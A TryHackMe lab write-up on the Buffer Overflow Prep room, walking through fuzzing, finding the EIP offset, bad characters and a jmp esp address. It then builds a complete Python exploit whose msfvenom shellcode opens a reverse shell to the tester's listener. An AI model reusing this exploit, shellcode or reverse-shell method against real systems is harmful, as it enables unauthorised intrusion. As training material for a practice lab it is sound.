---
title: Buffer Overflow Prep Writeup || Tryhackme
date: 2025-1-28 00:00:00 +0800
categories: [Tryhackme, Offensive Pentesting Path]
tags: [tryhackme, writeup, walkthrough, buffer, overflow]     # TAG names should always be lowercase
description: This is a Writeup for Buffer Overflow Prep Room Which is a part of the offensive pentesting path on Tryhackme
---

In this writeup we will solve the "OVERFLOW10" part in this room

### Preparing The Environment

Start with opening the machine then RDP connect to it you will find the immunity debugger on the desktop right click on it and start as administrator.

Now open the **oscp.exe** which is on the desktop then click the red button to run it, and now the target is running on port 1337.

Connect to it via **nc** to make sure that it is accepting inputs and everything is working properly.

```
nc 10.10.112.53 1337
```

Then type **OVERFLOW10 test** and then you must get **OVERFLOW10 COMPLETE** now we know that everything is working properly terminate the connection and let's start.


## Mona Configuration

Mona is a script that can be used to automate and speed up specific searches while developing exploits it works on immunity debugger and it is preinstalled on our system we just need to Setting the working folder with this command (run in the command input box at the bottom of the Immunity Debugger window)
```
!mona config -set workingfolder c:\mona\%p
```
This ensures that all Mona-generated outputs (like logs, patterns, and offsets) are saved in a dedicated directory.

### Fuzzing

Create a file on your Kali with the following contents:

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.112.53"

port = 1337
timeout = 5
prefix = "OVERFLOW10 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

This script sends progressively larger payloads of "A" characters to the OVERFLOW10 command until the application crashes.

Buffer overflows occur when more data is written to a buffer than it can handle. The application’s crash indicates that we have found the approximate size of the vulnerable buffer.

Now run the script to see when it will crash and we will find that it crashed at 600 bytes

![img-description](/assets/img/BOF_Fuzzing.png)
_Fuzzing_

### Crash Replication & Controlling EIP

Now create another file on your kali that we will use to exploit our application and put the following content in it:

```
import socket

ip = "10.10.112.53"
port = 1337

prefix = "OVERFLOW10 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload= ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Now Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

A cyclic pattern is a unique sequence of characters generated using pattern_create.rb. The goal is to identify the exact position in the input where the Extended Instruction Pointer (EIP) is overwritten.

**Ex:** If you send "AAAAA..." and the crash doesn’t tell you where in the payload EIP is overwritten, a cyclic pattern helps pinpoint the exact offset.

Put the output of the command in the payload string in the second script, and go back to the immunity debugger reopne the application "Ctrl + F2" and then click the red icon again to run it and then run the exploit script.

after succesfully doing the last step we need now to know the exact EIP offset that it crached on it so we will run this command

```
!mona findmsp -distance 1000
```

![img-description](/assets/img/BOF_EIPOffset.png)
_EIP Offset_

And we will find that the exact offset is 537.

Now restart the appliaction and run it again, then update the exploit script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB" and we will find that the EIP register is overwritten succesfully which means that we have the right value.

![img-description](/assets/img/BOF_Overwrite.png)
_EIP Overwrite_


### Finding Bad Characters

We need to Identify bytes that cause issues during payload delivery and remove them from our payload.

Bad characters, like \x00 (null byte), can terminate strings prematurely or corrupt data, causing the payload to fail so we need to remove them.

Generate a bytearray from \x01 to \xff, excluding null bytes (\x00). This serves as our reference for comparison.

```
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Update your exploit script and set the payload variable to the string of bad chars the script generates, restart and run the appliaction again and then run the exploit script.

Now make a note of the address to which the ESP register points which is in my case **01ADFA30**

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01ADFA30
```

A popup window should appear labelled "mona Memory comparison results". The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

![img-description](/assets/img/BOF_Badchars.png)
_Bad Chars_

**Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.**

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. 

```
!mona bytearray -b "\x00\xa0\xa1\xad\xae\xbe\xbf\xde\xdf\xef\xf0"
```

Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

![img-description](/assets/img/BOF_Unmodified.png)
_End of Bad Chars_

### Finding a Jump Point

Now run the following command, making sure to update the -cpb option with all the badchars you identified (including \x00):

```
!mona jmp -r esp -cpb "\x00\xa0\xa1\xad\xae\xbe\xbf\xde\xdf\xef\xf0"
```

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified.

![img-description](/assets/img/BOF_jmp.png)
_JMP ESP_

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

### Generate Payload

Run the following msfvenom command on Kali for making the reverse shell payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\xa0\xa1\xad\xae\xbe\xbf\xde\xdf\xef\xf0" -f c
```

Copy the generated C code strings and integrate them into your exploit script payload variable.

### Prepend NOPs

Encoders used in msfvenom may require additional space in memory for the payload to decode and execute so we can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```

### Exploit

Now our exploit script should be something like this

```
import socket

ip = "10.10.112.53"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload= ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xa3\x3b\x63\x1c\x83\xee\xfc\xe2\xf4\x5f\xd3\xe1\x1c"
"\xa3\x3b\x03\x95\x46\x0a\xa3\x78\x28\x6b\x53\x97\xf1\x37"
"\xe8\x4e\xb7\xb0\x11\x34\xac\x8c\x29\x3a\x92\xc4\xcf\x20"
"\xc2\x47\x61\x30\x83\xfa\xac\x11\xa2\xfc\x81\xee\xf1\x6c"
"\xe8\x4e\xb3\xb0\x29\x20\x28\x77\x72\x64\x40\x73\x62\xcd"
"\xf2\xb0\x3a\x3c\xa2\xe8\xe8\x55\xbb\xd8\x59\x55\x28\x0f"
"\xe8\x1d\x75\x0a\x9c\xb0\x62\xf4\x6e\x1d\x64\x03\x83\x69"
"\x55\x38\x1e\xe4\x98\x46\x47\x69\x47\x63\xe8\x44\x87\x3a"
"\xb0\x7a\x28\x37\x28\x97\xfb\x27\x62\xcf\x28\x3f\xe8\x1d"
"\x73\xb2\x27\x38\x87\x60\x38\x7d\xfa\x61\x32\xe3\x43\x64"
"\x3c\x46\x28\x29\x88\x91\xfe\x53\x50\x2e\xa3\x3b\x0b\x6b"
"\xd0\x09\x3c\x48\xcb\x77\x14\x3a\xa4\xc4\xb6\xa4\x33\x3a"
"\x63\x1c\x8a\xff\x37\x4c\xcb\x12\xe3\x77\xa3\xc4\xb6\x4c"
"\xf3\x6b\x33\x5c\xf3\x7b\x33\x74\x49\x34\xbc\xfc\x5c\xee"
"\xf4\x76\xa6\x53\x69\x09\xca\x55\x0b\x1e\xa3\x2a\x3f\x95"
"\x45\x51\x73\x4a\xf4\x53\xfa\xb9\xd7\x5a\x9c\xc9\x26\xfb"
"\x17\x10\x5c\x75\x6b\x69\x4f\x53\x93\xa9\x01\x6d\x9c\xc9"
"\xcb\x58\x0e\x78\xa3\xb2\x80\x4b\xf4\x6c\x52\xea\xc9\x29"
"\x3a\x4a\x41\xc6\x05\xdb\xe7\x1f\x5f\x1d\xa2\xb6\x27\x38"
"\xb3\xfd\x63\x58\xf7\x6b\x35\x4a\xf5\x7d\x35\x52\xf5\x6d"
"\x30\x4a\xcb\x42\xaf\x23\x25\xc4\xb6\x95\x43\x75\x35\x5a"
"\x5c\x0b\x0b\x14\x24\x26\x03\xe3\x76\x80\x83\x01\x89\x31"
"\x0b\xba\x36\x86\xfe\xe3\x76\x07\x65\x60\xa9\xbb\x98\xfc"
"\xd6\x3e\xd8\x5b\xb0\x49\x0c\x76\xa3\x68\x9c\xc9")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

If you are sure that everything is right you can now start a nc listener on your kali to get the connection

```
nc -nlvp 4444
```

reopen the application and click the red icon again to run it and then run the exploit script and wait for the connection

![img-description](/assets/img/BOF_Exploit.png)
_Exploit_

We will find that we have recieved back a connection and now we are in the system.